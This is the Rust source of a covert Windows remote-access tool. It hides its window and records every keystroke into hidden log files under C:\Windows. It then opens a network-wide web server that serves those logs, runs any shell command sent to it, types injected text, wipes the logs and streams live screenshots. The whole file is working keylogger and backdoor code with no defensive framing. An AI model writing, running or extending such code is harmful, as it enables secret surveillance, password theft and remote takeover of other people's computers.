#![windows_subsystem = "windows"]

use rdev::listen;
use serde::Deserialize;
use enigo::{Keyboard, Enigo, Settings};
use xcap::{Monitor, image::ImageFormat};
use device_query::{DeviceEvents, DeviceEventsHandler};
use tokio::{net::TcpListener, process::Command, time::Duration};
use axum::{Form, Router, extract::ws::{Message, WebSocketUpgrade}, response::Html, routing::{get, post}};
use std::{env::args, fs::OpenOptions, sync::{Arc, Mutex}, io::{Seek, Read, Write, Cursor, SeekFrom}, os::windows::fs::OpenOptionsExt};

#[derive(Deserialize)]
struct Frm {
    choice: String,
    text: String,
}

#[tokio::main]
async fn main() {
    let mut arg = args();
    arg.next();

    let lock = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).attributes(2).open("C:\\Windows\\opt.log").unwrap()));
    let lock1 = lock.clone();
    let lock2 = lock.clone();

    let lck = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).attributes(2).open("C:\\Windows\\full.log").unwrap()));
    let lck1 = lck.clone();
    let lck2 = lck.clone();
    let lck3 = lck.clone();

    let handler = DeviceEventsHandler::new(Duration::ZERO).unwrap();
    let enigo = Arc::new(Mutex::new(Enigo::new(&Settings::default()).unwrap()));

    let _down = handler.on_key_down(move |key| {
        let mut f = lck2.lock().unwrap();
        f.seek(SeekFrom::End(0)).unwrap();
        f.write((key.to_string() + "&#x2193; ").as_bytes()).unwrap();
    });
    let _up = handler.on_key_up(move |key| {
        let mut f = lck3.lock().unwrap();
        f.seek(SeekFrom::End(0)).unwrap();
        f.write((key.to_string() + "&#x2191; ").as_bytes()).unwrap();
    });

    tokio::spawn(async move {
        loop {
            let l = lock2.clone();
            listen(move |e| {
                if let Some(name) = e.name {
                    let mut f = l.lock().unwrap();
                    f.seek(SeekFrom::End(0)).unwrap();
                    f.write(match &name[..] {
                        "&" => "&amp;",
                        "<" => "&lt;",
                        others => others,
                    }.as_bytes()).unwrap();
                }
            })
            .unwrap();
        }
    });

    axum::serve(
        TcpListener::bind("0.0.0.0:".to_string() + &arg.next().unwrap_or("1145".to_string()))
            .await
            .unwrap(),
        Router::new()
            .route(
                "/",
                post(async move |Form(Frm { choice, text })| {
                    match &choice[..] {
                        "cmd" => {
                            Command::new("cmd")
                                .creation_flags(0x08000000)
                                .arg("/c")
                                .arg(&text)
                                .spawn()
                                .unwrap();
                        }
                        "code" => (), // TODO: code
                        "eni" => (),  // TODO: enigo
                        "rdev" => (), // TODO: rdev
                        "txt" => enigo.lock().unwrap().text(&text).unwrap(),
                        "clr" => {
                            let mut f = lck.lock().unwrap();
                            let mut g = lock.lock().unwrap();
                            f.set_len(0).unwrap();
                            g.set_len(0).unwrap();
                            f.seek(SeekFrom::Start(0)).unwrap();
                            g.seek(SeekFrom::Start(0)).unwrap();
                        }
                        _ => (),
                    }
                    Html("<script>window.location.href=''</script>")
                })
                .get(async move || {
                    let mut f = lck1.lock().unwrap();
                    let mut g = lock1.lock().unwrap();
                    f.seek(SeekFrom::Start(0)).unwrap();
                    g.seek(SeekFrom::Start(0)).unwrap();
                    let mut s = String::new();
                    let mut t = String::new();
                    f.read_to_string(&mut s).unwrap();
                    g.read_to_string(&mut t).unwrap();
                    Html(
                        "<!DOCTYPE html><html><body><form action='/'method='post'><select name='choice'><option value='cmd'>cmd</option><option value='code'>key</option><option value='eni'>enigo</option><option value='rdev'>rdev</option><option value='txt'>input</option><option value='clr'>clear</option></select><input name='text'/><input type='submit'/></form><pre style='white-space:pre-wrap;'>"
                            .to_string() + &s + "<hr>" + &t
                        + "</pre><img src='screen.bmp'/><script>const ws=new WebSocket('screen.bmp');const img=document.querySelector('img');ws.onmessage=(e)=>{if(e.data instanceof Blob)img.src=URL.createObjectURL(event.data)}</script></body></html>",
                    )
                }),
            )
            .route(
                "/screen.bmp",
                get(async |ws: WebSocketUpgrade| {
                    ws.on_upgrade(async |mut sk| loop {
                        let mut buf = Cursor::new(Vec::new());
                        Monitor::all().unwrap()[0]
                            .capture_image()
                            .unwrap()
                            .write_to(&mut buf, ImageFormat::Bmp)
                            .unwrap();
                        sk.send(Message::from(buf.into_inner())).await.unwrap();
                    })
                }),
            ),
    )
    .await
    .unwrap();
}
